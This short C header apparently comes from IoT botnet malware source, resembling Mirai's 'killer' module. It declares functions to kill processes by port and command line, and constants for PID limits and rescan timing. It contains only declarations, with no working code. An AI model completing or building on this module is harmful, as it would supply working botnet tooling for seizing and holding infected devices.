#pragma once

#include "includes.h"

enum 
{
	KILLER_MIN_PID              = 400,
	KILLER_RESTART_SCAN_TIME    = 600
};

BOOL killer_kill_by_port(port_t);
void killer_tcp_init(char *);
void killer_init(char *);
void killer_kill(void);

static int cmdline_check(char *, char *);
